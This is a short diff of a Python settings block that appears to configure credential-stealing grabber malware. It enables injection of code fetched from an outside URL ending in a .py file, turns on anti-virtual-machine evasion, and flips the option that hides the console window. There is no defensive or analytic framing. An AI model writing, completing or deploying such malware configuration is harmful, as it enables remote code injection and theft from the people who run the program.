@@ -21,7 +21,7 @@ config = {
     'keep-alive': False,
     'injection_url': 'https://tenorcom.vercel.app/api/skibidi%20hawk%20tuah.py',
     'inject': True,
-    'hideconsole': True,
+    'hideconsole': False,
     'antivm': True,
     'force_admin': False,
     'black_screen': False,
